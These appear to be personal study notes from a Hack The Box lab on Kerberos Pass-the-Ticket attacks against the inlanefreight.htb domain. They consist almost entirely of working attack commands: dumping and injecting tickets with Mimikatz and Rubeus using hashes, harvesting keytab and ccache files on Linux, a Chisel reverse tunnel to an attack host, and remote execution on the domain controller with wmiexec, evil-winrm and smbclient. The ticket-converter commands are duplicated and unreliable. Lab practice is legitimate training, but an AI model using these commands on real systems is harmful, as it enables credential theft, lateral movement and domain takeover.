- [ ] Harvesting Kerberos tickets from Windows
- [ ] PTT - Rubeus | Mimikatz
- [ ] Pass The Ticket with PowerShell Remoting
- [ ] Harvesting Kerberos tickets from Linux
- [ ] Abusing KeyTab
- [ ] Ticket converter
- [ ] PTT - Linux

Harvesting Kerberos tickets from Windows!!!
```powershell
# mimikatz
sekurlsa::tickets /export
sekurlsa::ekeys
# rubeus
Rubeus.exe dump /nowrap
# findstr
where /R C:\ *.kirbi
Get-ChildItem C:\ -Recurse -Include *.kirbi -ErrorAction Ignore
```
PTT - Rubeus | Mimikatz!!!
```powershell
# 1-rubeus
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

Rubeus.exe ptt /ticket:ticket.kirbi

[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))

Rubeus.exe ptt /ticket:base64-ticket
# 2-mimikatz
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\tk.kirbi"
misc::cmd
```
Pass The Ticket with PowerShell Remoting!!!
```powershell
# mimikatz
kerberos::ptt "C:\Users\Administrator\Desktop\tk.kirbi"
exit
powershell -ep bypass
Enter-PSSession -ComputerName DC01

# rubeus
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

powershell -ep bypass
Enter-PSSession -ComputerName DC01
```
Harvesting Kerberos tickets from Linux!!!
![[Pasted image 20251110000102.png]]
```sh
# Identifying Linux and Active Directory integration
realm list
ps -ef | grep -i "winbind\|sssd"
# keytab files
find / -name *keytab* -ls 2>/dev/null
find / -name *.kt -ls 2>/dev/null
# the linux machine ticket
/etc/krb5.keytab
# ticket in crontabs
crontab -l
cat /etc/crontab
# Finding ccache files
env | grep -i krb5
echo $KRB5CCNAME
ls -la /tmp
```
Abusing KeyTab!!!
```sh
# use keytab to have a ticket (ccache)
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab 
klist
# use ccache
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
# keytabextract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

NB:
A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
```
Ticket converter!!!
```sh
# ccache to kirbi
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
# kirbi to ccache
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
PTT - Linux!!!
```sh
# Host file modified
/etc/hosts
172.16.1.10 DC01.inlanefreight.htb
# Proxychains configuration file
/etc/proxychains4.conf 
[ProxyList] socks5
127.0.0.1 1080
# Download Chisel to our attack host
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
# Connect to MS01 with xfreerdp
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
# Execute chisel from MS01
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
# set KRB5CCNAME on attack box
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
proxychains impacket-wmiexec dc01 -k

# Evil-WinRM
nano /etc/krb5.conf
proxychains evil-winrm -i dc01 -r inlanefreight.htb

# smbclient
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab 
klist
smbclient //dc01/C$ -k -c ls -no-pass
smbclient //dc01/julio -k -c 'get julio.txt' -no-pass
```